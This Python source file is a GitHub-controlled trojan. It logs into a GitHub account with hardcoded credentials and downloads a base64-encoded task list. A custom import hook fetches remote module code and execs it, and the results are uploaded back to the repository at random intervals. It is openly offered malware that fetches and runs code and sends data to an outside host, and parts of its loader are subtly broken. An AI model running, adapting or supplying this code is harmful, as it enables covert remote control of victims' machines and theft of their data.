import json
import base64
import imp
import time
import random
import threading
import queue
import os
import importlib
import sys

from github3 import login

trojan_id = "identyfikator"

trojan_config = "{}.json".format(trojan_id)
data_path = "data/{}/".format(trojan_id)
trojan_modules = []
task_queue = queue.Queue()
configured = False


def connect_to_github():
    gh = login(username="canyoe", password="mcgithub5")
    repo = gh.repository("canyoe", "test_repo")
    branch = repo.branch("master")

    return gh, repo, branch


def get_file_contents(filepath):

    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print("[*] Znaleziono plik {}".format(filepath))
            blob = repo.blob(filename._json_data['sha'])
            print('--------THIS----------')
            #return filepath

            return blob.content
        print('--------THAT----------')
    return None

def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    print(type(config_json))
    decoded_json = base64.b64decode(config_json)

    decoded_json = str(decoded_json)
    print(type(decoded_json))
    config = json.loads(decoded_json)
    configured = True

    for task in config:
        if task['module'] not in sys.modules:
            exec("import {}".format(task["module"]))

    return config

def store_module_result(data):

    gh,repo,branch = connect_to_github()
    remote_path = "data/{}/{}.data".format(trojan_id,random.randint(1000,1000000))
    repo.create_file(remote_path, "Message about confirm.", base64.b64encode(data))

    return


class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print("Proba pobrania {}".format(fullname))
            new_library = get_file_contents("modules/{}".format(fullname))

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self

            return None
    def load_module(self, name):
        module = imp.new_module(name)
        for self.current_module_code in module.__dict__:
            exec(self.current_module_code)
        sys.modules[name] = module

        return module


def module_runner(module):

    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    store_module_result(result)

    return

sys.meta_path = [GitImporter()]

while True:

    if task_queue.empty():
        config = get_trojan_config()

        for task in  config:
            t = threading.Thread(target=module_runner, args=(task['module'], ))
            t.start()
            time.sleep(random.randint(1,10))
        time.sleep(random.randint(1000, 10000))